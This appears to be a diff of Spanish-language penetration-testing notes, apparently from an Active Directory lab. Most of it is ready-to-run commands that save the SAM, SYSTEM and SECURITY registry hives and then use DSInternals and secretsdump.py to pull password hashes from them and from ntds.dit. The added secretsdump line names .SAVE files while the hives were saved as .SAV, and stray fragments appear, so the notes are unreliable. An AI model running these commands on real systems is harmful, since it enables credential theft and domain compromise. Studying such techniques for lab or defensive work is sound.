@@ -158,12 +158,14 @@ SAM y SYSTEM
 #El privilegio también nos permite realizar una copia de seguridad de SAM y SYSTEM para extraer pwd con secretsdump.py
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
+reg save HKLM\SECURITY SECURITY.SAV
 b'') 
 Import-Module .\DSInternals.psd1
 $key = Get-BootKey -SystemHivePath .\SYSTEM
 Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 #Usar DSInternals para extraer credenciales de NTDS
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
 #Lo mismo pero con secretdump de forma offline
 c) 
 https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
